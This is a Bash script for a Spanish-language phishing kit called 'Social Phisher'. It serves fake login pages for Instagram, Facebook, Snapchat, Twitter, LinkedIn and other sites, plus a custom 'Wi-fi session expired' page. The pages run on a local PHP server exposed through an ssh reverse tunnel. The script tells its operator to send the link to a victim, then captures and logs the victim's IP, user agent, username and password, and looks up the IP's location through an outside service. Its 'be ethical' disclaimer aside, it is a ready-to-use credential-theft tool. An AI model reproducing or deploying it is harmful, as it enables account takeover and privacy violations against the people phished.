#!/bin/bash



# Define colores de texto

RED='\033[0;91m'
BLUE='\033[0;94m'
PURPLE='\033[0;95m'
CYAN='\033[0;96m'

NC='\033[0m' # Sin Color

# Obtener fecha actual para el nombre del archivo
CURRENT_DATE=$(date +"%d.%m.%Y")
DATA_FILE="$HOME/SocialPhisher-Datos-${CURRENT_DATE}.txt"

# Variable global para controlar el bucle principal
KEEP_RUNNING=true

# Función para inicializar el archivo de datos
init_data_file() {
    echo "==========================================" > "$DATA_FILE"
    echo "Social Phisher - Datos Capturados" >> "$DATA_FILE"
    echo "Fecha: $(date)" >> "$DATA_FILE"
    echo "Servidor: $server" >> "$DATA_FILE"
    echo "==========================================" >> "$DATA_FILE"
    echo "" >> "$DATA_FILE"
    printf "\e[1;92m[+] Archivo de datos creado: \e[0m\e[1;77m%s\e[0m\n" "$DATA_FILE"
}

# Función para registrar IP en el archivo de datos
log_ip() {
    local ip=$1
    local ua=$2
    echo "[IP CAPTURADA] $(date '+%H:%M:%S')" >> "$DATA_FILE"
    echo "Dirección IP: $ip" >> "$DATA_FILE"
    echo "User-Agent: $ua" >> "$DATA_FILE"
    echo "------------------------------------------" >> "$DATA_FILE"
    echo "" >> "$DATA_FILE"
}

# Función para registrar credenciales en el archivo de datos
log_credentials() {
    local account=$1
    local password=$2
    echo "[CREDENCIALES CAPTURADAS] $(date '+%H:%M:%S')" >> "$DATA_FILE"
    echo "Cuenta: $account" >> "$DATA_FILE"
    echo "Contraseña: $password" >> "$DATA_FILE"
    echo "------------------------------------------" >> "$DATA_FILE"
    echo "" >> "$DATA_FILE"
}



# Función para limpiar la terminal

clear_terminal() {

    clear

}



big_welcome() {

    echo -e "${RED} __    __    ___  _        __   ___   ___ ___    ___      __ __   ____    __  __  _    ___  ____  ${NC}"

    echo -e "${RED}|  |__|  |  /  _]| |      /  ] /   \ |   |   |  /  _]    |  |  | /    |  /  ]|  |/ ]  /  _]|    \ ${NC}"

    echo -e "${RED}|  |  |  | /  [_ | |     /  / |     || _   _ | /  [_     |  |  ||  o  | /  / |  ' /  /  [_ |  D  )${NC}"

    echo -e "${RED}|  |  |  ||    _]| |___ /  /  |  O  ||  \_/  ||    _]    |  _  ||     |/  /  |    \ |    _]|    / ${NC}"

    echo -e "${RED}|  \`  ' ||   [_ |     /   \_ |     ||   |   ||   [_     |  |  ||  _  /   \_ |     ||   [_ |    \ ${NC}"

    echo -e "${RED} \      / |     ||     \     ||     ||   |   ||     |    |  |  ||  |  \     ||  .  ||     ||  .  \${NC}"

    echo -e "${RED}  \_/\_/  |_____||_____|\____| \___/ |___|___||_____|    |__|__||__|__|\____||__|\_||_____||__|\_${NC}"

    return

}



# Limpiar la terminal

clear_terminal



# Mostrar el mensaje de bienvenida

big_welcome



# Pausar por 3 segundos

sleep 3







# Social Phisher

# Versión en español para latinos



# Función para obtener lista de dependencias

get_dependencies_list() {

    local dependencies=()



    # Extraer dependencias mencionadas en el script

    while IFS= read -r line; do

        # Verificar comandos y extraer dependencias

        if [[ "$line" == *"xterm"* ]]; then

            dependencies+=("xterm")

        fi

        if [[ "$line" == *"php"* ]]; then

            dependencies+=("php")

        fi

        if [[ "$line" == *"ssh"* ]]; then

            dependencies+=("ssh")

        fi

    done < "$0" # Leer desde el archivo del script actual



    # Eliminar duplicados

    dependencies=($(echo "${dependencies[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))



    # Imprimir la lista de dependencias

    echo "${dependencies[@]}"

}



# Función para imprimir una línea de color

print_colored_line() {

    echo -e "\e[1;34m-------------------------------------------------------------------\e[0m"

}



# Llamar a la función para obtener la lista de dependencias

dependencies_list=$(get_dependencies_list)



# Imprimir la lista de dependencias con una línea de color arriba

print_colored_line

echo -e "\e[1;33mLista de dependencias:\e[0m"

echo "$dependencies_list"

print_colored_line







start_server() {

    server=$1

    # Iniciar el servidor

    echo "Iniciar el servidor para: $server"

}





# Trap mejorado para manejar Ctrl+C

trap 'printf "\n\e[1;92m[*] Deteniendo la captura de credenciales...\e[0m\n"; printf "\e[1;92m[+] Todos los datos guardados en: \e[0m\e[1;77m%s\e[0m\n" "$DATA_FILE"; KEEP_RUNNING=false; stop; exit 0' 2



menu() {



#!/bin/bash



# ASCII art para "Social Phisher"

echo -e "\e[1;94m"

echo "  ____            _ _      _    ____  _     _     _  "

echo " / ___|  ___   ___(_) | ___| |  |  _ \| |__ (_)___| |__   ___ _ __  "

echo " \___ \ / _ \ / __| | |/ _ \ |  | |_) | '_ \| / __| '_ \ / _ \ '__| "

echo "  ___) | (_) | (__| | |  __/ |  |  __/| | | | \__ \ | | |  __/ |  "  

echo " |____/ \___/ \___|_|_|\___|_|  |_|   |_| |_|_|___/_| |_|\___|_|  "

echo -e "\e[1;33m"
echo "                        Versión en español para latinos"



# Imprimir opciones del menú

printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m         \e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;91m LinkedIn\e[0m          \e[1;94m SOCIAL PHISHER  v1.0\e[0m\n"

printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m          \e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;91m Messenger\e[0m            \n"

printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Snapchat\e[0m          \e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest\e[0m             \n"

printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Twitter\e[0m           \e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;91m Badoo\e[0m                 \n"

printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;91m Personalizada\e[0m                                                          \n"



printf "                                                \e[1;94m VERSIÓN EN ESPAÑOL PARA LATINOS\e[0m\n"



read -p $'\n\e[1;92m➜ [\e[0m\e[1;77m*\e[0m\e[1;92m] Elige una opción: \e[0m' option





if [[ $option == 1 ]]; then

server="instagram"

start



elif [[ $option == 2 ]]; then

server="facebook"

start

elif [[ $option == 3 ]]; then

server="snapchat"

start

elif [[ $option == 4 ]]; then

server="twitter"

start

elif [[ $option == 5 ]]; then

server="linkedin"

start



elif [[ $option == 6 ]]; then

server="messenger"

start



elif [[ $option == 7 ]]; then

server="pinterest"

start



elif [[ $option == 8 ]]; then

server="badoo"

start



elif [[ $option == 9 ]]; then

server="create"

createpage

start



else

printf "\e[1;93m [!] Opción inválida!\e[0m\n"

menu

fi

}



stop() {

    checklocalhostrun=$(ps aux | grep -o "localhost.run" | head -n1)

    checkphp=$(ps aux | grep -o "php" | head -n1)

    checknode=$(ps aux | grep -o "node" | head -n1)

    if [[ $checklocalhostrun == *'localhost.run'* ]]; then

        pkill -f -2 localhost.run > /dev/null 2>&1

        killall -2 localhost.run > /dev/null 2>&1

    fi

    if [[ $checkphp == *'php'* ]]; then

        pkill -f -2 php > /dev/null 2>&1

        killall -2 php > /dev/null 2>&1

    fi

    if [[ $checknode == *'node'* ]]; then

        pkill -f -2 node > /dev/null 2>&1

        killall -2 node > /dev/null 2>&1

    fi

}





banner() {

    printf "\n"

    printf "\e[1;93m#############################################\e[0m\n"

    printf "\e[1;93m#           SÉ ÉTICO                       #\e[0m\n"

    printf "\e[1;93m#                                           #\e[0m\n"

    printf "\e[1;93m#                                           #\e[0m\n"

    printf "\e[1;93m#            :) :) :) :) :) :) :)           #\e[0m\n"

    printf "\e[1;93m#                                           #\e[0m\n"

    printf "\e[1;93m#  Con gran poder viene una gran            #\e[0m\n"

    printf "\e[1;93m#        responsabilidad                    #\e[0m\n"

    printf "\e[1;93m#                                           #\e[0m\n"

    printf "\e[1;93m#             .--.                          #\e[0m\n"

    printf "\e[1;93m#            |o_o |                         #\e[0m\n"

    printf "\e[1;93m#            |:_/ |                         #\e[0m\n"

    printf "\e[1;93m#           //   \ \                        #\e[0m\n"

    printf "\e[1;93m#          (|     | )                       #\e[0m\n"

    printf "\e[1;93m#         /'\_   _/ \                       #\e[0m\n"

    printf "\e[1;93m#         \___)=(___/                       #\e[0m\n"

    printf "\e[1;93m#                                           #\e[0m\n"

    printf "\e[1;93m#  NO SOY RESPONSABLE DEL MAL USO          #\e[0m\n"

    printf "\e[1;93m#         DE ESTE SCRIPT                   #\e[0m\n"

    printf "\e[1;93m#                                           #\e[0m\n"

    printf "\e[1;93m#############################################\e[0m\n"

    printf "\n"

}



createpage() {

    default_cap1="Sesión de Wi-fi Expirada"

    default_cap2="Por favor inicia sesión nuevamente."

    default_user_text="Usuario:"

    default_pass_text="Contraseña:"

    default_sub_text="Iniciar Sesión"



    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Título 1 (Por defecto: Sesión de Wi-fi Expirada): \e[0m' cap1

    cap1="${cap1:-${default_cap1}}"



    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Título 2 (Por defecto: Por favor inicia sesión nuevamente.): \e[0m' cap2

    cap2="${cap2:-${default_cap2}}"



    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Campo de usuario (Por defecto: Usuario:): \e[0m' user_text

    user_text="${user_text:-${default_user_text}}"



    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Campo de contraseña (Por defecto: Contraseña:): \e[0m' pass_text

    pass_text="${pass_text:-${default_pass_text}}"



    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Campo de envío (Por defecto: Iniciar Sesión): \e[0m' sub_text

    sub_text="${sub_text:-${default_sub_text}}"



    echo "<!DOCTYPE html>" > sites/create/login.html

    echo "<html>" >> sites/create/login.html

    echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html

    IFS=$'\n'

    printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html

    IFS=$'\n'

    printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html

    IFS=$'\n'

    printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html

    IFS=$'\n'

    printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html

    IFS=$'\n'

    printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html

    IFS=$'\n'

    printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html

    printf '</center>' >> sites/create/login.html

    printf '<body>\n' >> sites/create/login.html

    printf '</html>\n' >> sites/create/login.html

}

catch_cred() {
    account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
    IFS=$'\n'
    password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
    
    printf "\n\e[1;92m[+] ¡CREDENCIALES CAPTURADAS!\e[0m\n"
    printf "\e[1;93m[USUARIO] Cuenta:\e[0m\e[1;77m %s\n\e[0m" $account
    printf "\e[1;93m[PASS] Contraseña:\e[0m\e[1;77m %s\n\e[0m" $password
    printf "\e[1;92m[GUARDADO] Guardado en: sites/%s/saved.usernames.txt\e[0m\n" $server
    printf "\e[1;92m[LOG] Agregado a: \e[0m\e[1;77m%s\e[0m\n" "$DATA_FILE"
    cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
    
    # Registrar en archivo de datos
    log_credentials "$account" "$password"
    
    # Limpiar el archivo de credenciales capturadas para detectar nuevas capturas
    rm -rf sites/$server/usernames.txt
    
    printf "\e[1;93m[*] Esperando a la próxima víctima...\e[0m\n"
}


getcredentials() {
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Esperando credenciales ...\e[0m\n"
    
    while [ "$KEEP_RUNNING" = true ]; do
        if [[ -e "sites/$server/usernames.txt" ]]; then
            printf "\n\e[1;92m[\e[0m*\e[1;92m] ¡Credenciales Encontradas!\n"
            catch_cred
        fi
        sleep 1
    done
}

catch_ip() {
    touch sites/$server/saved.usernames.txt
    ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
    
    printf "\n\e[1;92m[+] ¡VÍCTIMA CONECTADA!\e[0m\n"
    printf "\e[1;93m[IP] IP de la víctima:\e[0m\e[1;77m %s\e[0m\n" $ip
    printf "\e[1;93m[UA] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
    printf "\e[1;92m[GUARDADO] IP guardada en: sites/%s/saved.ip.txt\e[0m\n" $server
    printf "\e[1;92m[LOG] Agregado a: \e[0m\e[1;77m%s\e[0m\n" "$DATA_FILE"
    cat sites/$server/ip.txt >> sites/$server/saved.ip.txt

    # Registrar en archivo de datos
    log_ip "$ip" "$ua"

    if [[ -e iptracker.log ]]; then
        rm -rf iptracker.log
    fi

    IFS='\n'
    iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
    IFS=$'\n'
    continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
    
    hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
    if [[ $hostnameip != "" ]]; then
        printf "\e[1;92m[HOSTNAME] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
    fi
    
    rm -rf iptracker.log
}

start() {

    printf "\n"

    printf "1. \e[1;94mLocalhost.run\e[0m\n"

    echo ""

    read -p $'\n\e[1;92m┌──[ Elige el método de túnel: ]──┐\e[0m\n\e[1;92m│                                   │\e[0m\n\e[1;92m└─► ' host



    if [[ $host == 1 ]]; then

        # Preguntar al usuario si quiere usar el puerto por defecto

        read -p $'\n\e[1;92m┌──[ ¿Usar puerto por defecto 5555? (s/n) ]──┐\e[0m\n\e[1;92m│                                   │\e[0m\n\e[1;92m└─► ' use_default_port



        # Establecer el puerto según la entrada del usuario

        if [[ $use_default_port == "s" || $use_default_port == "S" ]]; then

            port=5555

        else

            read -p $'\n\e[1;92m┌──[ Ingresa un puerto personalizado: ]──┐\e[0m\n\e[1;92m│                            │\e[0m\n\e[1;92m└─► ' port

        fi



        xterm -e "bash -c 'printf \"Iniciando enlace de Localhost.run...\n\"; ssh -R 80:localhost:$port nokey@localhost.run'" &

        sleep 2

        start_localhostrun $port

    fi

}



start_localhostrun() {

    local port=$1



    while true; do

        if [[ -e sites/$server/ip.txt ]]; then

            rm -rf sites/$server/ip.txt

         fi

        if [[ -e sites/$server/usernames.txt ]]; then

            rm -rf sites/$server/usernames.txt

        fi



        printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando servidor php en el puerto $port...\n"

        cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &

        sleep 2



        printf "\e[1;92m[\e[0m*\e[1;92m] Por favor envía el siguiente enlace que se muestra en la terminal xterm a la víctima, se muestra como: \e[0m\e[1;94mhttps://<link>.lhr.life\e[0m\n"



        # Esperando a que la víctima abra el enlace

        printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Esperando a que la víctima abra el enlace...\e[0m\n"



        # Monitorear continuamente ip.txt para cambios

        while [ true ]; do

            if [[ -s "sites/$server/ip.txt" ]]; then

                printf "\n\e[1;92m[\e[0m*\e[1;92m] ¡IP Encontrada!\n"

                catch_ip

                printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Esperando credenciales...\e[0m\n"
                printf "\n\e[1;91m[!] Presiona Ctrl+C para detener la captura de credenciales\e[0m\n"

                break # Salir del bucle después de mostrar IP

            fi

            sleep 1

        done



        # Monitorear continuamente usernames.txt para cambios

        while [ true ]; do

            if [[ -s "sites/$server/usernames.txt" ]]; then

                printf "\n\e[1;92m[\e[0m*\e[1;92m] ¡Credenciales Encontradas!\n"

                catch_cred

                break # Salir del bucle después de encontrar credenciales

            fi

            sleep 1

        done



        # Esperando a que otra víctima abra el enlace

        printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Esperando a que otra víctima abra el enlace...\e[0m\n"

    done
}

checkfound() {
    printf "\n"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Esperando a que la víctima abra el enlace ...\e[0m\n"
    
    while true; do
        if [[ -e "sites/$server/ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m*\e[1;92m] ¡IP Encontrada!\n"
            catch_ip
        fi
        
        if [[ -e "sites/$server/usernames.txt" ]]; then
            printf "\n\e[1;92m[\e[0m*\e[1;92m] ¡Credenciales Encontradas!\n"
            catch_cred
        fi
        
        sleep 1
    done
}


# El script principal comienza aquí



# Eliminar archivos innecesarios

rm -rf index.html

rm -rf .gitignore

rm -rf .nojekyll



# Mostrar banner y iniciar el menú

banner

menu

